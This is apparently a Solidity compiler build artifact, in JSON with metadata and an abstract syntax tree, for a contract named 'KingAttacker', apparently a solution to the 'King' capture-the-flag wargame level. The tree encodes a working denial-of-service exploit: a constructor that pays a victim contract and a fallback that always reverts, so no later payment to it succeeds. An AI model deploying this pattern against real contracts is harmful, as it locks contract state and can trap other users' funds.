					"metadata": "{\"compiler\":{\"version\":\"0.8.15+commit.e14f2714\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_victimContractAddress\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/KingAttack.sol\":\"KingAttacker\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/KingAttack.sol\":{\"keccak256\":\"0x595963eca5fafdbef5d4316ab122dd8b2432e837c0a11aeacef99005765aac87\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://f2bca0a73dda9091a25beceed1d87233bf0a8e0c8ec86d3084a1dbda3b554c35\",\"dweb:/ipfs/QmWeX4SAccV3coc72SBLYzh1Dt7mjPB98o17oZGb9wMZR6\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "Warning: Return value of low-level calls not used.\n --> contracts/KingAttack.sol:6:9:\n  |\n6 |         address(_victimContractAddress).call{value: msg.value}(\"\");\n  |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 210,
					"file": "contracts/KingAttack.sol",
					"start": 152
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/KingAttack.sol": {
				"ast": {
					"absolutePath": "contracts/KingAttack.sol",
					"exportedSymbols": {
						"KingAttacker": [
							27
						]
					},
					"id": 28,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "KingAttacker",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 27,
							"linearizedBaseContracts": [
								27
							],
							"name": "KingAttacker",
							"nameLocation": "69:12:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 17,
										"nodeType": "Block",
										"src": "141:77:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"hexValue": "",
															"id": 14,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "207:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															},
															"value": ""
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																"typeString": "literal_string \"\""
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"typeString": "literal_string \"\""
																}
															],
															"expression": {
																"arguments": [
																	{
																		"id": 8,
																		"name": "_victimContractAddress",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 3,
																		"src": "160:22:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"id": 7,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "152:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 6,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "152:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 9,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "152:31:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 10,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "call",
															"nodeType": "MemberAccess",
															"src": "152:36:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
															}
														},
														"id": 13,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"names": [
															"value"
														],
														"nodeType": "FunctionCallOptions",
														"options": [
															{
																"expression": {
																	"id": 11,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "196:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 12,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"src": "196:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"src": "152:54:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 15,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "152:58:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 16,
												"nodeType": "ExpressionStatement",
												"src": "152:58:0"
											}
										]
									},
									"id": 18,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "_victimContractAddress",
												"nameLocation": "109:22:0",
												"nodeType": "VariableDeclaration",
												"scope": 18,
												"src": "101:30:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 2,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "101:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "100:32:0"
									},
									"returnParameters": {
										"id": 5,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "141:0:0"
									},
									"scope": 27,
									"src": "89:129:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 25,
										"nodeType": "Block",
										"src": "254:40:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"hexValue": "4e6f20776179206d616e21",
															"id": 22,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "272:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360",
																"typeString": "literal_string \"No way man!\""
															},
															"value": "No way man!"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_a0458b4adefbd3a6c265da219675cc7c904646a8539417d519804083c7068360",
																"typeString": "literal_string \"No way man!\""
															}
														],
														"id": 21,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967277,
															4294967277
														],
														"referencedDeclaration": 4294967277,
														"src": "265:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (string memory) pure"
														}
													},
													"id": 23,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "265:21:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 24,
												"nodeType": "ExpressionStatement",
												"src": "265:21:0"
											}
										]
									},
									"id": 26,
									"implemented": true,
									"kind": "fallback",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "234:2:0"
									},
									"returnParameters": {
										"id": 20,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "254:0:0"
									},
									"scope": 27,
									"src": "226:68:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 28,
							"src": "60:237:0",
							"usedErrors": []
						}
					],
					"src": "33:264:0"
				},
				"id": 0
			}
		}
	}
}